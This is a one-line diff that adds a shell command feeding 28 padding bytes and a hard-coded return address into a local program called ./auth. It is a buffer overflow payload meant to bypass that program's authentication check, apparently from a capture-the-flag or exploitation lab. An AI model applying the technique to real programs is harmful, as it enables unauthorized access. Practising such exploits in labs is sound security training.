@@ -1,0 +1,1 @@
+printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAA\xce\x84\x04\x08" | ./auth
